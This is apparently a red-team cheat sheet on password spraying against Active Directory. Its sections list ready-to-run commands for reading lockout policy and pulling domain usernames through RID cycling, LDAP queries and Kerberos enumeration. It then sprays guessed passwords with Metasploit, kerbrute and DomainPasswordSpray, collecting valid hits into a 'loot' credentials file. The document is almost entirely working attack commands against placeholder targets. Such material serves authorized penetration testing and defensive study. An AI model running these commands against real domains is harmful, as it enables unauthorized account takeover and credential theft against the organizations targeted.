# Password Spraying




## Password Policy

Enumerate password policy in the domain:

```
$ cme smb 10.10.13.37 -u snovvcrash -p 'Passw0rd!' --pass-pol
PS > Get-ADDefaultDomainPasswordPolicy
Cmd > net accounts
```

Example of `net accounts` output:

| **Name (EN)**                          | **Name (RU)**                             | **Value** |
|----------------------------------------|-------------------------------------------|-----------|
| Minimum password age (days):           | Минимальный срок действия пароля (дней):  | 1         |
| Maximum password age (days):           | Максимальный срок действия пароля (дней): | 90        |
| Minimum password length:               | Минимальная длина пароля:                 | 10        |
| Length of password history maintained: | Хранение неповторяющихся паролей:         | 24        |
| Lockout threshold:                     | Блокировка после ошибок ввода пароля:     | 7         |
| Lockout duration (minutes):            | Длительность блокировки (минут):          | 30        |
| Lockout observation window (minutes):  | Сброс счетчика блокировок через (минут):  | 30        |




## Get Domain Users



### Non-Authenticated

Perform [RID cycling](https://www.trustedsec.com/blog/new-tool-release-rpc_enum-rid-cycling-attack/) attack against a DC with SMB null sessions allowed via [lookupsid.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/lookupsid.py):

```
$ lookupsid.py MEGACORP/snovvcrash:'Passw0rd!'@127.0.0.1 20000 | tee ~/ws/log/lookupsid.out
$ cat ~/ws/log/lookupsid.out | grep SidTypeUser | grep -v -e '\$' -e '{' -e '}' -e HealthMailbox | awk -F'\' '{print $2}' | awk '{print $1}' | perl -nle 'print if m{^[[:ascii:]]+$}' > ~/ws/enum/all-users.txt
```



### Authenticated

Query LDAP for all domain user accounts via [GetADUsers.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetADUsers.py):

```
$ GetADUsers.py MEGACORP/snovvcrash:'Passw0rd!' -all -dc-ip 192.168.1.11 | tee ~/ws/log/GetADUsers.out
```

Query LDAP for all domain user accounts via [windapsearch](https://github.com/ropnop/windapsearch):

```
$ python3 windapsearch.py --dc-ip 192.168.1.11 -d megacorp.local -u 'MEGACORP\snovvcrash' -p 'Passw0rd!' -U | tee ~/ws/log/windapsearch.out
$ cat ~/ws/log/windapsearch.out | grep userPrincipalName | grep -v -e '{' -e '}' -e HealthMailbox | awk '{print $2}' | awk -F@ '{print $1}' | perl -nle 'print if m{^[[:ascii:]]+$}' > ~/ws/enum/all-users.txt
```

Query LDAP for all **active** domain user accounts via [go-windapsearch](https://github.com/ropnop/go-windapsearch):

```
$ ./go-windapsearch --dc 192.168.1.11 -d megacorp.local -u snovvcrash -p 'Passw0rd!' -m custom --filter '(&(objectCategory=person)(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))' --attrs sAMAccountName,mail,pwdLastSet,lastLogon | tee ~/ws/log/go-windapsearch.out
$ cat ~/ws/log/go-windapsearch.out | grep -i samaccountname | grep -v -e '{' -e '}' -e HealthMailbox | awk '{print $2}' | perl -nle 'print if m{^[[:ascii:]]+$}' | sort -u > ~/ws/enum/all-users.txt
```




## MSF

```
msf > use auxiliary/scanner/smb/smb_login
msf > set RHOSTS <DC_IP>
msf > set SMBDomain megacorp.local
msf > set SMBPass Passw0rd!
msf > set USER_FILE /home/snovvcrash/ws/enum/all-users.txt
msf > set VERBOSE False
msf > run
```




## kerbrute

* [https://github.com/ropnop/kerbrute](https://github.com/ropnop/kerbrute)

Generate a wordlist of common usernames in an appropriate format and validate it against KDC ([doesn't cause](https://github.com/ropnop/kerbrute#user-enumeration) accounts lock out):

```
$ ./kerbrute userenum -d megacorp.local -o ~/ws/log/kerbrute-userenum.log ~/ws/enum/names.txt
$ cat ~/ws/log/kerbrute-userenum.log | grep VALID | awk '{print $7}' | awk -F@ '{print $1}' > ~/ws/enum/valid-users.txt
```

Perform password spraying for discovered accounts:

```
$ ./kerbrute -v --delay 100 passwordspray -d megacorp.local -o ~/ws/log/kerbrute-passwordspray-'123456'.log ~/ws/enum/valid-users.txt '123456'
$ cat ~/ws/log/kerbrute-passwordspray-'123456'.log | grep VALID | awk '{print $7}' >> ~/ws/loot/creds.txt
```




## DomainPasswordSpray

* [https://github.com/dafthack/DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)

```
PS > Invoke-DomainPasswordSpray -UserList .\all-users.txt -Domain megacorp.local -Password 'Passw0rd!' -OutFile spray-results.txt
```
